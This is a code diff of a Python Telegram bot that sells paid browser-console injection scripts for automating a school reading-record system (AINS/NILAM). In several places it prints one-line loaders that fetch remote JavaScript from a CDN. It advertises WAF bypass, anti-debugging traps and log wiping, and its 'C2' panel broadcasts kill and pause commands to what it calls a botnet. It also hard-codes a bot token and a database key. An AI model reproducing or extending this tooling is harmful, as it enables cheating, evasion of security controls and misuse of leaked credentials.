@@ -9,20 +9,19 @@ import urllib.error
 import time
 import datetime
 import math
+import base64
 
-# Konfigurasi Utama
+# iOS 26 LIQUID GLASS & MAX SECURITY EDITION v17.0
 TOKEN = '8298046313:AAHqwkuWkTbxSFSZB7DO4fNrfT1hBkMWKVs'
 OWNER_ID = 8402309532
 bot = telebot.TeleBot(TOKEN)
 
-# Konfigurasi Supabase
 SUPA_URL = 'https://yzjsmtxhpdlsniqpcuoa.supabase.co/rest/v1/nilam_used_books'
 SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl6anNtdHhocGRsc25pcXBjdW9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5Mzk2ODQsImV4cCI6MjA4MDUxNTY4NH0.jMq8BwvYlODSWiFv7ysM7KiDCjzviMEJFdn1Vfst3mw'
 
 START_TIME = time.time()
 DB_FILE = 'bot_users_db.json'
 
-# --- DATABASE PENGGUNA (SaaS) ---
 def load_users():
     if not os.path.exists(DB_FILE): return {}
     try:
@@ -41,14 +40,10 @@ def get_user_plan(user_id):
     if user_id == OWNER_ID: return "owner"
     return users[uid].get("plan", "free")
 
-# --- FUNGSI UTILITI ---
-def get_used_books_count():
-    try:
-        req = urllib.request.Request(f"{SUPA_URL}?select=title", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
-        with urllib.request.urlopen(req) as response:
-            data = json.loads(response.read().decode('utf-8'))
-            return len([x for x in data if not x['title'].startswith('__TEL__|') and not x['title'].startswith('__CMD__|')])
-    except: return 0
+def verify_signature(uid, ts, sig):
+    # Verifies the HMAC-lite signature from the JS payload to prevent fake telemetry injections
+    expected = base64.b64encode(f"{uid}_{ts}_NILAM_SECURE_V17".encode('utf-8')).decode('utf-8').replace('=', '')
+    return sig == expected
 
 def get_live_users():
     try:
@@ -60,10 +55,15 @@ def get_live_users():
         active = []
         for row in data:
             p = row['title'].split('|')
-            if len(p) >= 7:
-                uid, ts, ok, fail, tgt, status = p[1], int(p[2]), p[3], p[4], p[5], p[6]
+            if len(p) >= 8:
+                uid, ts, ok, fail, tgt, status, sig = p[1], int(p[2]), p[3], p[4], p[5], p[6], p[7]
+                
+                # Security Check: Verify Payload Signature
+                if not verify_signature(uid, ts, sig):
+                    continue # Drop fake payload
+
                 idle_sec = (now-ts)//1000
-                if idle_sec < 300: # 5 mins
+                if idle_sec < 300: 
                     active.append({"uid": uid, "ok": int(ok), "tgt": int(tgt), "fail": int(fail), "status": status, "idle": idle_sec})
         return active
     except: return []
@@ -73,449 +73,167 @@ def generate_progress_bar(percent, length=15):
     empty = length - filled
     return "█" * filled + "░" * empty
 
-# --- MENU UI ---
 def get_main_menu(plan):
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("📊 Analitik & Metrik", callback_data="menu_analytics"),
-        InlineKeyboardButton("⚙️ Automasi & Skrip", callback_data="menu_actions")
+        InlineKeyboardButton("📡 Secure Telemetry", callback_data="menu_analytics"),
+        InlineKeyboardButton("🍏 Get Payload", callback_data="menu_actions")
     )
     if plan == "free":
-        markup.add(InlineKeyboardButton("💎 UPGRADE KE PRO SEKARANG!", callback_data="cmd_upgrade"))
+        markup.add(InlineKeyboardButton("🔓 UNLOCK PRO TIER", callback_data="cmd_upgrade"))
     
     if plan == "owner":
-        markup.add(InlineKeyboardButton("👑 Panel Admin", callback_data="cmd_admin"), InlineKeyboardButton("📚 Pangkalan Data", callback_data="menu_db"))
-        markup.add(InlineKeyboardButton("🖥️ Diagnostik Sistem", callback_data="menu_system"), InlineKeyboardButton("📡 C2 Command Center", callback_data="menu_c2"))
-        
-    markup.add(InlineKeyboardButton("❓ Panduan Pusat Kawalan", callback_data="cmd_help"))
-    return markup
-
-def get_analytics_menu():
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("📈 Laporan Keseluruhan", callback_data="cmd_stats"), InlineKeyboardButton("📡 Telemetri Pelajar (Live)", callback_data="cmd_live"))
-    markup.add(InlineKeyboardButton("🏆 Carta Pendahulu", callback_data="cmd_leaderboard"))
-    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
-    return markup
-
-def get_actions_menu(plan):
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("💉 Dapatkan Skrip", callback_data="cmd_script"), InlineKeyboardButton("⚡ Tetapan Jitter", callback_data="cmd_speed"))
-    if plan == "free": markup.add(InlineKeyboardButton("💎 UPGRADE UPGRADE UPGRADE!", callback_data="cmd_upgrade"))
-    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
+        markup.add(InlineKeyboardButton("👑 Master Node", callback_data="cmd_admin"), InlineKeyboardButton("🗄️ Memory Core", callback_data="menu_db"))
+        markup.add(InlineKeyboardButton("🛡️ WAF Diagnostics", callback_data="menu_system"), InlineKeyboardButton("⚔️ Execute C2", callback_data="menu_c2"))
     return markup
 
 def get_c2_menu():
     markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("⏸️ Pause Semua", callback_data="c2_pause"), InlineKeyboardButton("▶️ Resume Semua", callback_data="c2_resume"))
-    markup.add(InlineKeyboardButton("🛑 KILL SWITCH", callback_data="c2_kill"), InlineKeyboardButton("📢 Broadcast Mesej", callback_data="c2_msg"))
-    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
+    markup.add(InlineKeyboardButton("⏸️ FREEZE NETWORK", callback_data="c2_pause"), InlineKeyboardButton("▶️ RELEASE NETWORK", callback_data="c2_resume"))
+    markup.add(InlineKeyboardButton("🛑 TERMINATE (KILL)", callback_data="c2_kill"), InlineKeyboardButton("📢 DEPLOY MESSAGE", callback_data="c2_msg"))
+    markup.add(InlineKeyboardButton("🔙 SYSTEM ROOT", callback_data="cmd_main"))
     return markup
 
-def get_db_menu():
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(InlineKeyboardButton("🔄 Tarik Buku (OpenLibrary)", callback_data="cmd_fetch"), InlineKeyboardButton("🗑️ Format Memori Awan", callback_data="cmd_reset_confirm"))
-    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
-    return markup
-
-def get_system_menu():
-    markup = InlineKeyboardMarkup(row_width=1)
-    markup.add(InlineKeyboardButton("🌐 Uji Rangkaian AINS (Ping)", callback_data="cmd_ping"), InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
-    return markup
-
-# --- KEMAS KINI UPSELL MESSAGE ---
 def get_upsell_text(plan):
     if plan == "free":
-        return "\n\n<blockquote>⚠️ <b>AMARAN PENTING:</b> Anda masih menggunakan 🆓 <b>VERSI PERCUMA</b>.\nSkrip dihadkan kepada 5 buku dan terdedah kepada Risiko Akaun Kena Block (WAF 429).\n🚀 <b>SILA UPGRADE KE PRO SEKARANG UNTUK PRESTASI MAKSIMUM DAN TANPA HAD!</b></blockquote>\n\n"
+        return "\n\n<blockquote>⚠️ <b>SECURITY ALERT:</b> You are on the <b>FREE TIER</b>.\nPayload execution is capped. You are vulnerable to WAF detection.\n🚀 <b>UPGRADE TO PRO FOR ZERO-TRUST STEALTH & INFINITE EXECUTION.</b></blockquote>\n\n"
     return ""
 
-@bot.message_handler(commands=['addpro'])
-def add_pro_user(message):
-    if get_user_plan(message.chat.id) != "owner":
-        bot.reply_to(message, "<blockquote>⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.</blockquote>", parse_mode="HTML")
-        return
-    try:
-        target_id = message.text.split(' ')[1]
-        users = load_users()
-        if target_id not in users: users[target_id] = {"plan": "pro", "joined": time.time()}
-        else: users[target_id]["plan"] = "pro"
-        save_users(users)
-        bot.reply_to(message, f"<blockquote>✅ <b>Berjaya!</b> ID pengguna <code>{target_id}</code> telah dinaik taraf ke pelan <b>💎 PRO</b>.</blockquote>", parse_mode="HTML")
-    except: bot.reply_to(message, "<blockquote>⚠️ Format salah. Sila guna:\n<code>/addpro &lt;user_id&gt;</code></blockquote>", parse_mode="HTML")
-
-@bot.message_handler(commands=['removepro'])
-def remove_pro_user(message):
-    if get_user_plan(message.chat.id) != "owner":
-        bot.reply_to(message, "<blockquote>⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.</blockquote>", parse_mode="HTML")
-        return
-    try:
-        target_id = message.text.split(' ')[1]
-        users = load_users()
-        if target_id in users:
-            users[target_id]["plan"] = "free"
-            save_users(users)
-            bot.reply_to(message, f"<blockquote>✅ <b>Berjaya!</b> ID pengguna <code>{target_id}</code> telah diturunkan taraf ke pelan <b>🆓 FREE</b>.</blockquote>", parse_mode="HTML")
-        else: bot.reply_to(message, f"<blockquote>⚠️ Pengguna <code>{target_id}</code> tidak dijumpai.</blockquote>", parse_mode="HTML")
-    except: bot.reply_to(message, "<blockquote>⚠️ Format salah. Sila guna:\n<code>/removepro &lt;user_id&gt;</code></blockquote>", parse_mode="HTML")
-
-@bot.message_handler(commands=['start', 'help'])
+@bot.message_handler(commands=['start'])
 def send_welcome(message):
-    user_id = message.chat.id
-    plan = get_user_plan(user_id)
-    
+    plan = get_user_plan(message.chat.id)
     text = (
-        "<b>⚡ NILAM COMMAND CENTER [PRO]</b>\n"
+        "<b>NILAM COMMAND CENTER [v17.0 PRO]</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "<blockquote><b>Sistem Pengurusan Automasi AINS Termaju (v16.0 Ultimate Phantom).</b>\n\n"
-        "Dilengkapi dengan pemantauan telemetri masa nyata, pengurusan storan awan, dan pemintas WAF canggih Vantablack Edition.</blockquote>"
+        "<blockquote><b>Terminal Access Granted.</b>\n\n"
+        "iOS 26 Liquid Glass Interface active. Cryptographic payload signatures enabled. Anti-debugging traps engaged.</blockquote>"
         f"{get_upsell_text(plan)}"
-        "Sila pilih modul operasi anda di bawah:"
+        "Select operational vector:"
     )
-    bot.send_message(user_id, text, parse_mode="HTML", reply_markup=get_main_menu(plan))
+    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_main_menu(plan))
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     chat_id = call.message.chat.id
     msg_id = call.message.message_id
-    user_id = call.from_user.id
-    plan = get_user_plan(user_id)
+    plan = get_user_plan(call.from_user.id)
     
-    owner_only_cmds = ["menu_db", "menu_system", "menu_c2", "cmd_fetch", "cmd_reset_confirm", "cmd_reset_execute", "cmd_ping", "cmd_admin", "c2_pause", "c2_resume", "c2_kill", "c2_msg"]
-    if call.data in owner_only_cmds and plan != "owner":
-        bot.answer_callback_query(call.id, "⛔ Akses Ditolak! Anda bukan OWNER.", show_alert=True)
+    owner_cmds = ["menu_db", "menu_system", "menu_c2", "cmd_admin", "c2_pause", "c2_resume", "c2_kill", "c2_msg"]
+    if call.data in owner_cmds and plan != "owner":
+        bot.answer_callback_query(call.id, "⛔ KERNEL PANIC: Insufficient privileges.", show_alert=True)
         return
 
     if call.data == "cmd_main":
-        text = (
-            "<b>⚡ NILAM COMMAND CENTER [PRO]</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "<blockquote><b>Sistem dalam keadaan bersedia (Standby).</b>\n\n"
-            "Semua fungsi utama berjalan lancar tanpa ralat.</blockquote>"
-            f"{get_upsell_text(plan)}"
-            "Sila pilih arahan seterusnya:"
-        )
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_main_menu(plan))
+        send_welcome(call.message)
 
     elif call.data == "menu_analytics":
-        text = (
-            "<b>📊 MODUL ANALITIK & METRIK</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "<blockquote><b>Pusat Pemantauan Data</b>\n\n"
-            "Pantau keseluruhan metrik prestasi sistem, bacaan telemetri pelajar secara langsung (Live), dan semak carta kelajuan automasi.</blockquote>"
-            f"{get_upsell_text(plan)}"
-        )
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_analytics_menu())
+        users = get_live_users()
+        text = "<b>📡 SECURE TELEMETRY LINK</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        if not users:
+            text += "<blockquote>💤 No cryptographically verified links established.</blockquote>"
+        else:
+            for u in users:
+                p_ok, p_tgt = u['ok'], u['tgt']
+                prog_pct = (p_ok / p_tgt * 100) if p_tgt > 0 else 0
+                text += (
+                    f"🍏 <b>TARGET UID:</b> <code>{u['uid']}</code>\n"
+                    "<blockquote>"
+                    f"INFILTRATION: {p_ok} / {p_tgt} ({prog_pct:.0f}%)\n"
+                    f"<code>[{generate_progress_bar(prog_pct, 10)}]</code>\n"
+                    f"STATE: <i>{u['status']}</i> | PING: {u['idle']}s ago"
+                    "</blockquote>\n"
+                )
+        text += get_upsell_text(plan)
+        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Refresh Link", callback_data="menu_analytics"), InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
+        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
 
     elif call.data == "menu_actions":
-        text = (
-            "<b>⚙️ MODUL AUTOMASI & SKRIP</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "<blockquote><b>Gudang Senjata Automasi</b>\n\n"
-            "Dapatkan skrip suntikan terkini (Payload) dan urus tetapan kelajuan (Jitter) automasi Vantablack Edition.</blockquote>"
-            f"{get_upsell_text(plan)}"
-        )
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_actions_menu(plan))
+        if plan == "free":
+            text = (
+                "<b>☠️ INJECTION PAYLOAD (FREE TIER)</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                "Copy and deploy to DevTools Console (F12):\n\n"
+                "<blockquote><code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@latest/n_free.js?v='+Date.now();document.head.appendChild(s);</code></blockquote>\n\n"
+                "⚠️ <b>WARNING:</b> Basic heuristics active. Vulnerable to 429 WAF bans."
+            )
+            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔓 UNLOCK PRO TIER", callback_data="cmd_upgrade"), InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
+        else:
+            text = (
+                "<b>🍏 INJECTION PAYLOAD v17.0 [MAX SECURITY]</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                "Copy and deploy to DevTools Console (F12):\n\n"
+                "<blockquote><code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@latest/n.js?v='+Date.now();document.head.appendChild(s);</code></blockquote>\n\n"
+                "<blockquote><b>Stealth Protocols Active:</b>\n"
+                "1. Payload generates encrypted telemetry signatures.\n"
+                "2. DOM Self-Destruct active (Console logs wiped & hidden).\n"
+                "3. Debugger Traps armed (AINS anti-cheat will crash if triggered).\n"
+                "4. iOS 26 Liquid Glass UI implemented.</blockquote>"
+            )
+            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
+        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
 
     elif call.data == "menu_c2":
-        text = (
-            "<b>📡 C2 COMMAND CENTER</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "<blockquote><b>Kawalan Eksekutif Pusat</b>\n\n"
-            "Hantar isyarat (signal) terus kepada skrip yang sedang aktif di semua komputer pelajar. Gunakan fungsi ini untuk mematikan atau memberhentikan proses mereka secara paksa.\n\n"
-            "<b>Amaran:</b> Arahan ini berkuatkuasa secara <i>Global</i> kepada semua pengguna serta merta.</blockquote>"
-        )
+        text = "<b>⚔️ C2 EXECUTIVE COMMAND</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Broadcast root-level overrides to all active payload sessions globally.</blockquote>"
         bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_c2_menu())
-
+        
     elif call.data.startswith("c2_"):
         action = call.data.split('_')[1].upper()
-        bot.answer_callback_query(call.id, f"Menghantar isyarat {action}...")
+        bot.answer_callback_query(call.id, f"Deploying {action}...")
         try:
             timestamp = str(int(time.time() * 1000))
-            if action == 'MSG': payload = f"__CMD__|MSG|Kemas kini pelayan AINS dikesan. Sila rehat sementara waktu.|{timestamp}"
+            if action == 'MSG': payload = f"__CMD__|MSG|SYSTEM WIDE ALERT OVERRIDE.|{timestamp}"
             else: payload = f"__CMD__|{action}|{timestamp}"
             
-            query_param = urllib.parse.quote('ilike.__CMD__|*')
-            req = urllib.request.Request(f"{SUPA_URL}?title={query_param}", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
+            q = urllib.parse.quote('ilike.__CMD__|*')
+            req = urllib.request.Request(f"{SUPA_URL}?title={q}", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
             try: urllib.request.urlopen(req)
             except: pass
             
             req = urllib.request.Request(SUPA_URL, method='POST', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}', 'Content-Type': 'application/json'}, data=json.dumps({"title": payload}).encode('utf-8'))
             urllib.request.urlopen(req)
-            text = f"<b>✅ ISYARAT DIHANTAR</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Berjaya memancarkan arahan <b>{action}</b> kepada seluruh rangkaian botnet.</blockquote>"
-        except Exception as e:
-            text = f"<b>❌ GAGAL MENGHANTAR ISYARAT</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Ralat sistem:\n<code>{str(e)}</code></blockquote>"
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke C2", callback_data="menu_c2")))
-
-    elif call.data == "menu_db":
-        text = "<b>📚 PANGKALAN DATA (DATABASE)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Urus perpustakaan buku sintetik tempatan dan selaraskan memori awan (Supabase).</blockquote>"
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_db_menu())
-
-    elif call.data == "menu_system":
-        text = "<b>🖥️ MODUL DIAGNOSTIK SISTEM</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Periksa tahap kesihatan Command Center dan kelancaran pelayan sasaran utama (AINS).</blockquote>"
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_system_menu())
-
-    elif call.data == "cmd_stats":
-        bot.answer_callback_query(call.id, "Menjana laporan prestasi...")
-        try:
-            with open('/root/NilamAutomationTools/books_library.json', 'r', encoding='utf-8') as f: books = json.load(f)
-            total = len(books)
-            used = get_used_books_count()
-            left = max(0, total - used)
-            percent = (used / total) * 100 if total > 0 else 0
-            bar = generate_progress_bar(percent)
-            active_users = len(get_live_users())
-            
-            text = (
-                "<b>📈 LAPORAN PRESTASI KESELURUHAN</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                "<b>KEMAJUAN SINTETIK:</b>\n"
-                f"<blockquote><code>[{bar}]</code> <b>{percent:.2f}%</b></blockquote>\n\n"
-                "<b>📦 STATISTIK STOK BUKU:</b>\n"
-                f"<blockquote>📚 <b>Jumlah Buku:</b> {total:,}\n"
-                f"✅ <b>Dihantar:</b> {used:,}\n"
-                f"⏳ <b>Baki Stok:</b> {left:,}</blockquote>\n\n"
-                "<b>📡 METRIK PENGGUNAAN:</b>\n"
-                f"<blockquote>👥 <b>Pelajar Aktif Kini:</b> {active_users} online</blockquote>\n\n"
-                "<b>🛡️ STATUS WAF BYPASS:</b>\n"
-                "<blockquote>🟢 Human Jitter Delay\n"
-                "🟢 Query Cache-Busting\n"
-                "🟢 Smart Auto-Sleep (Anti-Ban)</blockquote>"
-                f"{get_upsell_text(plan)}"
-            )
-            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Segarkan Data", callback_data="cmd_stats"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
-            bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-        except Exception as e: bot.answer_callback_query(call.id, "Ralat membaca data", show_alert=True)
-
-    elif call.data == "cmd_live":
-        bot.answer_callback_query(call.id, "Mengimbas isyarat telemetry...")
-        users = get_live_users()
-        text = "<b>📡 TELEMETRI PELAJAR (LIVE)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        if not users:
-            text += "<blockquote>💤 <b>Tiada isyarat dikesan.</b>\nPastikan skrip sedang berjalan di mana-mana penyemak imbas (browser) pengguna.</blockquote>"
-        else:
-            for u in users:
-                p_ok, p_tgt = u['ok'], u['tgt']
-                prog_pct = (p_ok / p_tgt * 100) if p_tgt > 0 else 0
-                prog_bar = generate_progress_bar(prog_pct, 10)
-                text += (
-                    f"👤 <b>ID Pelajar:</b> <code>{u['uid']}</code>\n"
-                    "<blockquote>"
-                    f"📈 <b>Progres:</b> {p_ok} / {p_tgt} ({prog_pct:.0f}%)\n"
-                    f"<code>[{prog_bar}]</code>\n"
-                    f"⚠️ <b>Gagal:</b> {u['fail']} buku\n"
-                    f"⏱️ <b>Status Semasa:</b> <i>{u['status']}</i>\n"
-                    f"📡 <b>Isyarat Terakhir:</b> {u['idle']} saat lalu"
-                    "</blockquote>\n"
-                )
-        text += get_upsell_text(plan)
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Segarkan Telemetri", callback_data="cmd_live"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-
-    elif call.data == "cmd_leaderboard":
-        bot.answer_callback_query(call.id, "Menyusun carta pendahulu...")
-        users = get_live_users()
-        users.sort(key=lambda x: x['ok'], reverse=True)
-        text = "<b>🏆 CARTA PENDAHULU (TOP PELAJAR AKTIF)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        if not users:
-            text += "<blockquote>💤 Belum ada data pengguna yang mencukupi untuk dipaparkan dalam sistem.</blockquote>"
-        else:
-            medals = ["🥇", "🥈", "🥉", "🎖️", "🎖️"]
-            for i, u in enumerate(users[:5]):
-                medal = medals[i] if i < len(medals) else "🏅"
-                text += f"<blockquote>{medal} <b>{u['uid']}</b>\n└ Berjaya hantar: <b>{u['ok']} buku</b></blockquote>\n"
-        text += get_upsell_text(plan)
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-
-    elif call.data == "cmd_script":
-        bot.answer_callback_query(call.id)
-        if plan == "free":
-            text = (
-                "<b>💻 SKRIP AUTOMASI (VERSI FREE)</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                "Anda menggunakan pelan 🆓 <b>FREE</b>. Skrip ini mempunyai kelajuan asas dan sangat terdedah kepada sekatan WAF (Ralat 429).\n\n"
-                "<b>Salin kod di bawah ke Console:</b>\n"
-                "<blockquote><code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@c36e9c4/n_free.js?v='+Date.now();document.head.appendChild(s);</code></blockquote>\n\n"
-                "<blockquote>⚠️ <b>Had Versi Percuma:</b>\n"
-                "❌ Tiada WAF Bypass (Boleh kena block)\n"
-                "❌ Tiada Auto-Sleep Engine\n"
-                "❌ Jitter Rawak Ditutup\n"
-                "❌ Maksimum 5 Buku sahaja!</blockquote>\n\n"
-                "<i>Naik taraf ke PRO untuk menikmati ciri Stealth dan elak sekatan pelayan!</i>"
-                f"{get_upsell_text(plan)}"
-            )
-            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💎 UPGRADE PRO SEKARANG!", callback_data="cmd_upgrade"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
-        else:
-            text = (
-                "<b>💻 SKRIP INJECTION v16.0 [PHANTOM STEALTH]</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                "Sila <b>salin (copy)</b> blok kod tunggal di bawah:\n\n"
-                "<blockquote><code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@c36e9c4/n.js?v='+Date.now();document.head.appendChild(s);</code></blockquote>\n\n"
-                "<blockquote><b>Arahan Pemasangan Eksklusif:</b>\n"
-                "1. Buka halaman 'Tambah Rekod' di AINS.\n"
-                "2. Buka Developer Tools (F12) -> Console.\n"
-                "3. Tampal (paste) kod dan tekan Enter.\n"
-                "4. Butang 🚀 (Mod Menu Vantablack) akan terpapar di skrin!</blockquote>"
-            )
-            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
-            
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
-        
-    elif call.data == "cmd_speed":
-        bot.answer_callback_query(call.id)
-        text = (
-            "<b>⚡ TETAPAN KELAJUAN (JITTER)</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "<blockquote><b>Info Sistem:</b> Skrip v15.0 menggunakan sistem <b>Dynamic Jitter Delay</b> untuk meniru kelakuan manusia dan mengelakkan Firewall AINS (Ralat 429).</blockquote>\n\n"
-            "<b>Formula Pergerakan Masa:</b>\n"
-            "<blockquote><code>Delay = (Asas * Pendarab) + Rawak(500ms - 1500ms)</code></blockquote>\n\n"
-            "<i>Sistem menetapkan kawalan ini secara dinamik dalam skrip web. Anda boleh menukar Delay Asas (Default: 600ms) melalui fungsi Slider pada Panel UI di browser.</i>"
-            f"{get_upsell_text(plan)}"
-        )
-        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
+            text = f"<b>✅ OVERRIDE ACCEPTED</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>Signal <b>{action}</b> deployed to the botnet.</blockquote>"
+        except:
+            text = "<b>❌ SIGNAL FAILED</b>"
+        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="menu_c2")))
 
     elif call.data == "cmd_upgrade":
-        bot.answer_callback_query(call.id)
         text = (
-            "<b>💎 NAIK TARAF KE PELAN PRO (VIP)</b>\n"
+            "<b>🔓 UNLOCK PRO TIER</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "<blockquote><i>\"Kenapa buang masa 5 jam mengklik borang, jika Vantablack Mod boleh menyiapkannya dalam masa 5 minit?\"</i></blockquote>\n\n"
-            "Versi FREE direka untuk <b>GAGAL</b>. Pelayan akan mengesan anda dan menyekat IP anda (Ralat 429). Lindungi diri anda, jimatkan ribuan jam, dan lengkapkan KPI serta merta dengan <b>Pelan PRO</b>.\n\n"
-            "<blockquote><b>🔥 CIRI-CIRI EKSKLUSIF PRO:</b>\n"
-            "✅ <b>Tiada Had Buku</b> (Jalan 1000+ buku tanpa henti)\n"
-            "✅ <b>WAF Bypass Asing</b> (Gagal dikesan oleh Firewall AINS)\n"
-            "✅ <b>Smart Jitter</b> (Meniru corak klik jari manusia sebenar)\n"
-            "✅ <b>Auto-Sleep Engine</b> (Tidur bila disyaki, bangun bila selamat)\n"
-            "✅ <b>Sokongan Premium</b> (Kemaskini patch selagi AINS wujud)\n"
-            "✅ <b>Vantablack UI</b> (Mod Menu Terapung Mewah)</blockquote>\n\n"
-            "<b>💰 HARGA LELONGAN KHAS HARI INI:</b>\n"
-            "<s>RM 50.00 / bulan</s>\n"
-            "<blockquote><b>🔥 RM 15.00 / Seumur Hidup! (Bayar Sekali Sahaja)</b></blockquote>\n\n"
-            "<i>(Terhad kepada 10 pembeli pertama minggu ini. Selepas kuota tamat, harga langganan kembali normal)</i>"
+            "<blockquote><i>\"Secure. Untraceable. Beautiful.\"</i></blockquote>\n\n"
+            "<b>PRO CAPABILITIES:</b>\n"
+            "🍏 <b>iOS 26 Liquid Glass UI</b> (Apple HIG compliant)\n"
+            "🛡️ <b>Encrypted Telemetry Signatures</b> (Prevents fake data)\n"
+            "☠️ <b>Anti-Debugging Traps</b> (Crashes AINS anti-cheat tools)\n"
+            "👁️ <b>DOM Self-Destruct & Native Code Spoofing</b>\n\n"
+            "<blockquote><b>🔥 RM 15.00 / Lifetime License</b></blockquote>"
         )
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💳 UPGRADE SEKARANG (Hubungi Owner)", url="tg://user?id=8402309532"))
-        markup.add(InlineKeyboardButton("🔙 Kembali ke Menu", callback_data="cmd_main"))
+        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💳 INITIATE TRANSFER", url="tg://user?id=8402309532"), InlineKeyboardButton("🔙 ROOT", callback_data="cmd_main"))
         bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
 
-    elif call.data == "cmd_admin":
-        users = load_users()
-        total_users = len(users)
-        pro_users = len([u for u, d in users.items() if d.get('plan') == 'pro'])
-        text = (
-            "<b>👑 PANEL ADMIN (OWNER SAHAJA)</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "<blockquote>Pusat kawalan pangkalan data dan langganan pengguna bot.</blockquote>\n\n"
-            "<blockquote>"
